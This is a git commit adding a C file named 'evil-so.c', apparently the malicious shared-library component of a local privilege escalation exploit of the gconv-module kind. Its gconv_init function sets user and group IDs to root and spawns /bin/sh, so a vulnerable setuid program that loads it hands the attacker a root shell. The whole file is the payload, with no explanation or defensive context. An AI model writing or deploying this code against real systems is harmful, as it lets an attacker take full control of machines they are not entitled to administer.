e5cd702e62b71bd7f4ee21de381e184d7e543ff9
ryaagard <46634151+ryaagard@users.noreply.github.com>
2022-01-26 00:11:56 +0100

    Create evil-so.c

---
+++ evil-so.c
@@ -0,0 +1,13 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void gconv() {}
+
+void gconv_init() {
+    setuid(0);
+    setgid(0);
+    setgroups(0);
+
+    execve("/bin/sh", NULL, NULL);
+}
